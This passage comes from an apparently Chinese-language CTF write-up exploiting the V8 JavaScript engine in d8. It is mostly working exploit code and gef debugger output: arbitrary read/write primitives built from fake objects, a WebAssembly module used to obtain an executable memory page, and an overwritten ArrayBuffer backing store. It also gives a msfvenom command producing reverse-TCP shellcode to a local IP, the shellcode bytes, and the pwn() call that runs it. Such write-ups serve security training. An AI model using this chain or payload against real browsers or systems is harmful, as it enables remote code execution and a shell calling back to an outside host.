why.</span><br><span class="line">Reading symbols from ./d8...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gef➤  run --allow-natives-syntax --shell /root/v8build/rope2/xpl.js</span><br><span class="line">Starting program: /root/v8build/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell /root/v8build/rope2/xpl.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread 0x7ffff66c4700 (LWP 9528)]</span><br><span class="line">[New Thread 0x7ffff5ec3700 (LWP 9529)]</span><br><span class="line">[New Thread 0x7ffff56c2700 (LWP 9530)]</span><br><span class="line">[*] Float array map   :  0x8241909</span><br><span class="line">[*] Regular array map :  0x8241869</span><br><span class="line">[+] Controlled RW helper address: 0x8086b21</span><br><span class="line">V8 version 8.5.0 (candidate)</span><br><span class="line">d8&gt; %DebugPrint(rw_helper);</span><br><span class="line">0x06a908086b21 &lt;JSArray[4]&gt;</span><br><span class="line">[6.7481182e-316, 1.1, 2.2, 3.3]</span><br><span class="line">d8&gt; ^C</span><br><span class="line">gef➤  x/10xg 0x06a908086b21 - 1 - 0x30</span><br><span class="line">0x6a908086af0:	0x0000393638313432	0x0000000808040a3d</span><br><span class="line">0x6a908086b00:	0x0000000008241909	0x3ff199999999999a</span><br><span class="line">0x6a908086b10:	0x400199999999999a	0x400a666666666666</span><br><span class="line">0x6a908086b20:	0x080406e908241909	0x0000000808086af9</span><br><span class="line">0x6a908086b30:	0x0000000208040975	0x0000000008241909</span><br><span class="line">gef➤  x/10xg 0x06a908086b21 - 1 - 0x20</span><br><span class="line">0x6a908086b00:	0x0000000008241909	0x3ff199999999999a</span><br><span class="line">0x6a908086b10:	0x400199999999999a	0x400a666666666666</span><br><span class="line">0x6a908086b20:	0x080406e908241909	0x0000000808086af9</span><br><span class="line">0x6a908086b30:	0x0000000208040975	0x0000000008241909</span><br><span class="line">0x6a908086b40:	0x0000000008040975	0x0000000008040245</span><br><span class="line">gef➤  p 0x06a908086b21 - 0x20</span><br><span class="line"><span class="variable">$2</span> = 0x6a908086b01</span><br><span class="line">gef➤  p 0x06a908086b21 - 0x20 - 1</span><br><span class="line"><span class="variable">$3</span> = 0x6a908086b00</span><br><span class="line"></span><br><span class="line">如果在地址‘0x6a908086b00’处放置一个假对象，就能够访问索引1，也就是‘0x6a908086b10’。这样，生成的假对象将指向想要的地址的值。</span><br></pre></td></tr></table></figure>
+
+<p>对于write函数，它的工作原理与read函数相同:</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gYXJiX3dyaXRlKGFkZHIsIHZhbHVlKSB7CiAgICBsZXQgZmFrZSA9IGZha2VvYmoocndfaGVscGVyX2FkZHIgLSAweDIwbik7CiAgICByd19oZWxwZXJbMV0gPSBpdG9mKCgweDhuIDw8IDMybikgKyBhZGRyIC0gMHg4biwgNjQpOwogICAgZmFrZVswXSA9IGl0b2YodmFsdWUsIDY0KTsKfQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> arb_write(addr, value) &#123;</span><br><span class="line">    <span class="built_in">let</span> fake = fakeobj(rw_helper_addr - 0x20n);</span><br><span class="line">    rw_helper[1] = itof((<span class="number">0</span>x8n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">0</span>x8n, <span class="number">64</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(value, <span class="number">64</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果把逻辑分解:</p>
+<ul>
+<li>如果与arb_read的函数相比，它将覆盖存储在第一个下标处的值，而不是返回假数组的第一个值，这是伪造对象的结果。</li>
+</ul>
+<figure class="highlight bash" data-code="cmV0dXJuIGZ0b2koZmFrZVswXSwgNjQpOwo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> ftoi(fake[0], 64);</span><br></pre></td></tr></table></figure>
+
+<p>以上来自arb_read。</p>
+<figure class="highlight bash" data-code="ZmFrZVswXSA9IGl0b2YodmFsdWUsIDY0KTsK"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake[0] = itof(value, 64);</span><br></pre></td></tr></table></figure>
+
+<p>这是通过覆盖其它返回值读取函数,从这里利用下去,所说的在<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWJBc3NlbWJseQ==">WebAssembly Page in JS<i class="fa fa-external-link-alt"></i></span>,所以一开始,不能用经典的使用pwn挑战的方法使用system __free_hook覆盖,然后生成一个shell,在基于v8的挑战, 主要是CTFs,这是通过创建一个wasm函数来完成的，它将导致在程序的内存布局中创建一个rwx权限页，从这里的方法如下:</p>
+<ul>
+<li>找到rwx段地址，计算它的地址。</li>
+<li>将shellcode写入rwx段的区域。</li>
+<li>调用前面创建的wasm函数，因为shellcode将写入该函数，调用它最终将导致shellcode执行。</li>
+</ul>
+<figure class="highlight bash" data-code="dmFyIHdhc21Db2RlID0gbmV3IFVpbnQ4QXJyYXkoWzAsOTcsMTE1LDEwOSwxLDAsMCwwLDEsMTMzLDEyOCwxMjgsMTI4LDAsMSw5NiwwLDEsMTI3LDMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAxMzAsMTI4LDEyOCwxMjgsMCwxLDAsNCwxMzIsMTI4LDEyOCwxMjgsMCwxLDExMiwwLDAsNSwxMzEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAxMjgsMTI4LDEyOCwwLDEsMCwxLDYsMTI5LDEyOCwxMjgsMTI4LDAsMCw3LDE0NSwxMjgsMTI4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMTI4LDAsMiw2LDEwOSwxMDEsMTA5LDExMSwxMTQsMTIxLDIsMCw0LDEwOSw5NywxMDUsMTEwLDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwLDEwLDEzOCwxMjgsMTI4LDEyOCwwLDEsMTMyLDEyOCwxMjgsMTI4LDAsMCw2NSwwLDExXSk7CnZhciB3YXNtX21vZHVsZSA9IG5ldyBXZWJBc3NlbWJseS5Nb2R1bGUod2FzbUNvZGUpOwp2YXIgd2FzbV9pbnN0YW5jZSA9IG5ldyBXZWJBc3NlbWJseS5JbnN0YW5jZSh3YXNtX21vZHVsZSk7CnZhciBwd24gPSB3YXNtX2luc3RhbmNlLmV4cG9ydHMubWFpbjsK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,</span><br><span class="line">                               130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,</span><br><span class="line">                               128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,</span><br><span class="line">                               128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,</span><br><span class="line">                               0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);</span><br><span class="line">var wasm_module = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_module);</span><br><span class="line">var pwn = wasm_instance.exports.main;</span><br></pre></td></tr></table></figure>
+
+<p>这是用于创建rwx部分的pwn函数的JS代码，这一步先放在一边，继续:</p>
+<figure class="highlight bash" data-code="dmFyIHdhc21faW5zdGFuY2VfYWRkciA9IGFkZHJvZih3YXNtX2luc3RhbmNlKSAmIDB4ZmZmZmZmZmZuOwp2YXIgcnd4ID0gYXJiX3JlYWQod2FzbV9pbnN0YW5jZV9hZGRyICsgMHg2OG4gJiAweGZmZmZmZmZmbik7Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var wasm_instance_addr = addrof(wasm_instance) &amp; 0xffffffffn;</span><br><span class="line">var rwx = arb_read(wasm_instance_addr + 0x68n &amp; 0xffffffffn);</span><br></pre></td></tr></table></figure>
+
+<p>首先,需要找到rwx段的基地址,这是很容易找到的,要做的是找到的地址正是位于存储到内存和抵消,使用gef的</p>
+<figure class="highlight bash" data-code="c2VhcmNoLXBhdHRlcm4gcnd4X2FkZHJlc3MK"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search-pattern rwx_address</span><br></pre></td></tr></table></figure>
+
+<p>发现内存的引用位于抵消wasm_instance_addr + 0x68:</p>
+<figure class="highlight bash" data-code="Z2Vm4p6kICB2bW1hcApbIExlZ2VuZDogIENvZGUgfCBIZWFwIHwgU3RhY2sgXQpTdGFydCAgICAgICAgICAgICAgRW5kICAgICAgICAgICAgICAgIE9mZnNldCAgICAgICAgICAgICBQZXJtIFBhdGgKMHgwMDAwMTVmYzU0MDhhMDAwIDB4MDAwMDE1ZmM1NDA4YjAwMCAweDAwMDAwMDAwMDAwMDAwMDAgcnd4IAoweDAwMDAxOTA5MDAwMDAwMDAgMHgwMDAwMTkwOTAwMDBjMDAwIDB4MDAwMDAwMDAwMDAwMDAwMCBydy0gCjB4MDAwMDE5MDkwMDAwYzAwMCAweDAwMDAxOTA5MDAwNDAwMDAgMHgwMDAwMDAwMDAwMDAwMDAwIC0tLSAKMHgwMDAwMTkwOTAwMDQwMDAwIDB4MDAwMDE5MDkwMDA0MTAwMCAweDAwMDAwMDAwMDAwMDAwMDAgcnctIAoweDAwMDAxOTA5MDAwNDEwMDAgMHgwMDAwMTkwOTAwMDQyMDAwIDB4MDAwMDAwMDAwMDAwMDAwMCAtLS0gCjB4MDAwMDE5MDkwMDA0MjAwMCAweDAwMDAxOTA5MDAwNTIwMDAgMHgwMDAwMDAwMDAwMDAwMDAwIHIteCAKMHgwMDAwMTkwOTAwMDUyMDAwIDB4MDAwMDE5MDkwMDA3ZjAwMCAweDAwMDAwMDAwMDAwMDAwMDAgLS0tCgpbLi5zbmlwLi5dCgpnZWbinqQgIHNlYXJjaC1wYXR0ZXJuIDB4MDAwMDE1ZmM1NDA4YTAwMApbK10gU2VhcmNoaW5nICdceDAwXHhhMFx4MDhceDU0XHhmY1x4MTVceDAwXHgwMCcgaW4gbWVtb3J5ClsrXSBJbiAoMHgxOTA5MDgwODAwMDAtMHgxOTA5MDgxOGQwMDApLCBwZXJtaXNzaW9uPXJ3LQogIDB4MTkwOTA4MDg3NGUwIC0gMHgxOTA5MDgwODc1MDAgIOKGkiAgICJceDAwXHhhMFx4MDhceDU0XHhmY1x4MTVceDAwXHgwMFsuLi5dIiAKICAweDE5MDkwODA4NzUyYyAtIDB4MTkwOTA4MDg3NTRjICDihpIgICAiXHgwMFx4YTBceDA4XHg1NFx4ZmNceDE1XHgwMFx4MDBbLi4uXSIgClsrXSBJbiAoMHgxOTA5MDgyMDAwMDAtMHgxOTA5MDgyODAwMDApLCBwZXJtaXNzaW9uPXJ3LQogIDB4MTkwOTA4MjExMTc4IC0gMHgxOTA5MDgyMTExOTggIOKGkiAgICJceDAwXHhhMFx4MDhceDU0XHhmY1x4MTVceDAwXHgwMFsuLi5dIiAKWytdIEluICdbaGVhcF0nKDB4NTU1NTU2NDhkMDAwLTB4NTU1NTU2NThiMDAwKSwgcGVybWlzc2lvbj1ydy0KICAweDU1NTU1NjRkZGRjOCAtIDB4NTU1NTU2NGRkZGU4ICDihpIgICAiXHgwMFx4YTBceDA4XHg1NFx4ZmNceDE1XHgwMFx4MDBbLi4uXSIgCiAgMHg1NTU1NTY0ZGUyYzggLSAweDU1NTU1NjRkZTJlOCAg4oaSICAgIlx4MDBceGEwXHgwOFx4NTRceGZjXHgxNVx4MDBceDAwWy4uLl0iIAogIDB4NTU1NTU2NGRlM2EwIC0gMHg1NTU1NTY0ZGUzYzAgIOKGkiAgICJceDAwXHhhMFx4MDhceDU0XHhmY1x4MTVceDAwXHgwMFsuLi5dIiAKICAweDU1NTU1NjRkZTRjMCAtIDB4NTU1NTU2NGRlNGUwICDihpIgICAiXHgwMFx4YTBceDA4XHg1NFx4ZmNceDE1XHgwMFx4MDBbLi4uXSIgCiAgMHg1NTU1NTY0ZGU1MTAgLSAweDU1NTU1NjRkZTUzMCAg4oaSICAgIlx4MDBceGEwXHgwOFx4NTRceGZjXHgxNVx4MDBceDAwWy4uLl0iIAogIDB4NTU1NTU2NTc3NWUwIC0gMHg1NTU1NTY1Nzc2MDAgIOKGkiAgICJceDAwXHhhMFx4MDhceDU0XHhmY1x4MTVceDAwXHgwMFsuLi5dIiAKWytdIEluICgweDdmZmZlODAwMDAwMC0weDdmZmZlODAyMzAwMCksIHBlcm1pc3Npb249cnctCiAgMHg3ZmZmZTgwMDA5NzAgLSAweDdmZmZlODAwMDk5MCAg4oaSICAgIlx4MDBceGEwXHgwOFx4NTRceGZjXHgxNVx4MDBceDAwWy4uLl0iIApbK10gSW4gKDB4N2ZmZmYwMDAwMDAwLTB4N2ZmZmYwMDIzMDAwKSwgcGVybWlzc2lvbj1ydy0KICAweDdmZmZmMDAwNmQ5MCAtIDB4N2ZmZmYwMDA2ZGIwICDihpIgICAiXHgwMFx4YTBceDA4XHg1NFx4ZmNceDE1XHgwMFx4MDBbLi4uXSIgClsrXSBJbiAoMHg3ZmZmZjU2YzQwMDAtMHg3ZmZmZjVlYzQwMDApLCBwZXJtaXNzaW9uPXJ3LQogIDB4N2ZmZmY1ZWMyODIwIC0gMHg3ZmZmZjVlYzI4NDAgIOKGkiAgICJceDAwXHhhMFx4MDhceDU0XHhmY1x4MTVceDAwXHgwMFsuLi5dIiAKWytdIEluICgweDdmZmZmNWVjNTAwMC0weDdmZmZmNzBjOTAwMCksIHBlcm1pc3Npb249cnctCiAgMHg3ZmZmZjY2YzM4MjAgLSAweDdmZmZmNjZjMzg0MCAg4oaSICAgIlx4MDBceGEwXHgwOFx4NTRceGZjXHgxNVx4MDBceDAwWy4uLl0iIAogIDB4N2ZmZmY2NmMzOGEwIC0gMHg3ZmZmZjY2YzM4YzAgIOKGkiAgICJceDAwXHhhMFx4MDhceDU0XHhmY1x4MTVceDAwXHgwMFsuLi5dIgpnZWbinqQgIHAgMHgwMDAwMTkwOTAwMDAwMDAwICsgMHg4MjExMWM5CiQyID0gMHgxOTA5MDgyMTExYzkKZ2Vm4p6kICBwIDB4MTkwOTA4MjExMTc4IC0gMHgxOTA5MDgyMTExYzkKJDMgPSAweGZmZmZmZmZmZmZmZmZmYWYK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x000015fc5408a000 0x000015fc5408b000 0x0000000000000000 rwx </span><br><span class="line">0x0000190900000000 0x000019090000c000 0x0000000000000000 rw- </span><br><span class="line">0x000019090000c000 0x0000190900040000 0x0000000000000000 --- </span><br><span class="line">0x0000190900040000 0x0000190900041000 0x0000000000000000 rw- </span><br><span class="line">0x0000190900041000 0x0000190900042000 0x0000000000000000 --- </span><br><span class="line">0x0000190900042000 0x0000190900052000 0x0000000000000000 r-x </span><br><span class="line">0x0000190900052000 0x000019090007f000 0x0000000000000000 ---</span><br><span class="line"></span><br><span class="line">[..snip..]</span><br><span class="line"></span><br><span class="line">gef➤  search-pattern 0x000015fc5408a000</span><br><span class="line">[+] Searching <span class="string">&#x27;\x00\xa0\x08\x54\xfc\x15\x00\x00&#x27;</span> <span class="keyword">in</span> memory</span><br><span class="line">[+] In (0x190908080000-0x19090818d000), permission=rw-</span><br><span class="line">  0x1909080874e0 - 0x190908087500  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x19090808752c - 0x19090808754c  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x190908200000-0x190908280000), permission=rw-</span><br><span class="line">  0x190908211178 - 0x190908211198  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In <span class="string">&#x27;[heap]&#x27;</span>(0x55555648d000-0x55555658b000), permission=rw-</span><br><span class="line">  0x5555564dddc8 - 0x5555564ddde8  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555564de2c8 - 0x5555564de2e8  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555564de3a0 - 0x5555564de3c0  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555564de4c0 - 0x5555564de4e0  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555564de510 - 0x5555564de530  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x5555565775e0 - 0x555556577600  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x7fffe8000000-0x7fffe8023000), permission=rw-</span><br><span class="line">  0x7fffe8000970 - 0x7fffe8000990  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x7ffff0000000-0x7ffff0023000), permission=rw-</span><br><span class="line">  0x7ffff0006d90 - 0x7ffff0006db0  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x7ffff56c4000-0x7ffff5ec4000), permission=rw-</span><br><span class="line">  0x7ffff5ec2820 - 0x7ffff5ec2840  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">[+] In (0x7ffff5ec5000-0x7ffff70c9000), permission=rw-</span><br><span class="line">  0x7ffff66c3820 - 0x7ffff66c3840  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span> </span><br><span class="line">  0x7ffff66c38a0 - 0x7ffff66c38c0  →   <span class="string">&quot;\x00\xa0\x08\x54\xfc\x15\x00\x00[...]&quot;</span></span><br><span class="line">gef➤  p 0x0000190900000000 + 0x82111c9</span><br><span class="line"><span class="variable">$2</span> = 0x1909082111c9</span><br><span class="line">gef➤  p 0x190908211178 - 0x1909082111c9</span><br><span class="line"><span class="variable">$3</span> = 0xffffffffffffffaf</span><br></pre></td></tr></table></figure>
+
+<p>解决上面的问题，需要知道如何使用DataView和ArrayBuffer，因为这将帮助用所需的值覆盖地址，简而言之，这两个函数允许使用ArrayBuffer以二进制格式写入数据。</p>
+<figure class="highlight bash" data-code="Y29uc29sZS5sb2coIlsrXSBXYXNtIGluc3RhbmNlIGFkZHJlc3M6IDB4IiArIHdhc21faW5zdGFuY2VfYWRkci50b1N0cmluZygxNikpOwoKY29uc29sZS5sb2coIlsqXSBSV1ggSU5TVEFOQ0U6ICAgMHgiICsgcnd4LnRvU3RyaW5nKDE2KSk7CgoKdmFyIGFycl9idWYgPSBuZXcgQXJyYXlCdWZmZXIoMHgxMDApOwp2YXIgZGF0YXZpZXcgPSBuZXcgRGF0YVZpZXcoYXJyX2J1Zik7Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log(<span class="string">&quot;[+] Wasm instance address: 0x&quot;</span> + wasm_instance_addr.toString(16));</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[*] RWX INSTANCE:   0x&quot;</span> + rwx.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var arr_buf = new ArrayBuffer(0x100);</span><br><span class="line">var dataview = new DataView(arr_buf);</span><br></pre></td></tr></table></figure>
+
+<p>ArrayBuffer的后备存储可以看作是JSArray的元素指针。它可以在offset &amp;ArrayBuffer+0x14找到，可以通过使用d8二进制文件的x64.debug版本找到它。其原理是，不使用fakeobj直接写入任意地址，而是使用fakeobj执行arb-write操作，并修改合法ArrayBuffer的后备存储到任意地址，在本例中，该后备存储将被rwx段覆盖。现在，可以使用dataview.setBigUint64(0, val, true)将val作为64位小端值写入任意地址。如下所示:</p>
+<ul>
+<li>使用msfvenom生成shellcode并放入以下的js代码中</li>
+</ul>
+<figure class="highlight bash" data-code="bXNmdmVub20gLXAgbGludXgveDY0L3NoZWxsX3JldmVyc2VfdGNwIExIT1NUPTE5Mi4xNjguMTc3LjEyOCBMUE9SVD00MjIyIC1mIG51bQoKMHg2YSwgMHgyOSwgMHg1OCwgMHg5OSwgMHg2YSwgMHgwMiwgMHg1ZiwgMHg2YSwgMHgwMSwgMHg1ZSwgMHgwZiwgMHgwNSwgMHg0OCwgMHg5NywgMHg0OCwgCjB4YjksIDB4MDIsIDB4MDAsIDB4MTAsIDB4N2UsIDB4YzAsIDB4YTgsIDB4YjEsIDB4ODAsIDB4NTEsIDB4NDgsIDB4ODksIDB4ZTYsIDB4NmEsIDB4MTAsIAoweDVhLCAweDZhLCAweDJhLCAweDU4LCAweDBmLCAweDA1LCAweDZhLCAweDAzLCAweDVlLCAweDQ4LCAweGZmLCAweGNlLCAweDZhLCAweDIxLCAweDU4LCAKMHgwZiwgMHgwNSwgMHg3NSwgMHhmNiwgMHg2YSwgMHgzYiwgMHg1OCwgMHg5OSwgMHg0OCwgMHhiYiwgMHgyZiwgMHg2MiwgMHg2OSwgMHg2ZSwgMHgyZiwgCjB4NzMsIDB4NjgsIDB4MDAsIDB4NTMsIDB4NDgsIDB4ODksIDB4ZTcsIDB4NTIsIDB4NTcsIDB4NDgsIDB4ODksIDB4ZTYsIDB4MGYsIDB4MDUK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.177.128 LPORT=4222 -f num</span><br><span class="line"></span><br><span class="line">0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, </span><br><span class="line">0xb9, 0x02, 0x00, 0x10, 0x7e, 0xc0, 0xa8, 0xb1, 0x80, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, </span><br><span class="line">0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, </span><br><span class="line">0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, </span><br><span class="line">0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash" data-code="dmFyIGFycl9idWZfYWRkciA9IGFkZHJvZihhcnJfYnVmKSAmIDB4ZmZmZmZmZmZuOzsKdmFyIGJhY2tfc3RvcmVfYWRkciA9IGFyYl9yZWFkKGFycl9idWZfYWRkciArIDB4MTRuKTsKCmNvbnNvbGUubG9nKCJbK10gQXJyYXlCdWZmZXIgYWRkcmVzczogMHgiICsgYXJyX2J1Zl9hZGRyLnRvU3RyaW5nKDE2KSk7CmNvbnNvbGUubG9nKCJbK10gQmFjayBzdG9yZSBwb2ludGVyOiAweCIgKyBiYWNrX3N0b3JlX2FkZHIudG9TdHJpbmcoMTYpKTsKCmFyYl93cml0ZShhcnJfYnVmX2FkZHIgKyAweDE0biwgcnd4KTsKCnZhciBzaGVsbGNvZGUgPSBbCiAgICAweDZhLCAweDI5LCAweDU4LCAweDk5LCAweDZhLCAweDAyLCAweDVmLCAweDZhLCAweDAxLCAweDVlLCAweDBmLCAweDA1LCAweDQ4LCAweDk3LCAweDQ4LCAKICAgIDB4YjksIDB4MDIsIDB4MDAsIDB4MTAsIDB4N2UsIDB4YzAsIDB4YTgsIDB4YjEsIDB4ODAsIDB4NTEsIDB4NDgsIDB4ODksIDB4ZTYsIDB4NmEsIDB4MTAsIAogICAgMHg1YSwgMHg2YSwgMHgyYSwgMHg1OCwgMHgwZiwgMHgwNSwgMHg2YSwgMHgwMywgMHg1ZSwgMHg0OCwgMHhmZiwgMHhjZSwgMHg2YSwgMHgyMSwgMHg1OCwgCiAgICAweDBmLCAweDA1LCAweDc1LCAweGY2LCAweDZhLCAweDNiLCAweDU4LCAweDk5LCAweDQ4LCAweGJiLCAweDJmLCAweDYyLCAweDY5LCAweDZlLCAweDJmLCAKICAgIDB4NzMsIDB4NjgsIDB4MDAsIDB4NTMsIDB4NDgsIDB4ODksIDB4ZTcsIDB4NTIsIDB4NTcsIDB4NDgsIDB4ODksIDB4ZTYsIDB4MGYsIDB4MDUKXTsgIC8vIHNoZWxsY29kZSBmb3Igc3Bhd25pbmcgYSByZXZlcnNlIHNoZWxsIGZvciBsb2NhbCB0ZXN0Cgpmb3IgKGxldCBpID0gMDsgaSA8IHNoZWxsY29kZS5sZW5ndGg7IGkrKykgewogIGRhdGF2aWV3LnNldFVpbnQ4KGksIHNoZWxsY29kZVtpXSwgdHJ1ZSk7Cn0K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var arr_buf_addr = addrof(arr_buf) &amp; 0xffffffffn;;</span><br><span class="line">var back_store_addr = arb_read(arr_buf_addr + 0x14n);</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] ArrayBuffer address: 0x&quot;</span> + arr_buf_addr.toString(16));</span><br><span class="line">console.log(<span class="string">&quot;[+] Back store pointer: 0x&quot;</span> + back_store_addr.toString(16));</span><br><span class="line"></span><br><span class="line">arb_write(arr_buf_addr + 0x14n, rwx);</span><br><span class="line"></span><br><span class="line">var shellcode = [</span><br><span class="line">    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, </span><br><span class="line">    0xb9, 0x02, 0x00, 0x10, 0x7e, 0xc0, 0xa8, 0xb1, 0x80, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, </span><br><span class="line">    0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, </span><br><span class="line">    0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, </span><br><span class="line">    0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05</span><br><span class="line">];  // shellcode <span class="keyword">for</span> spawning a reverse shell <span class="keyword">for</span> <span class="built_in">local</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">  dataview.setUint8(i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在，只需要调用函数pwn就可以执行shellcode了:</p>
+<figure class="highlight bash" data-code="cHduKCk7Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn();</span><br></pre></td></tr></table></figure>
+
+<p>以.&#x2F;d8 .&#x2F;xpl.js的命令运行该漏洞js脚本，将能成功收到一个reverse shell:</p>
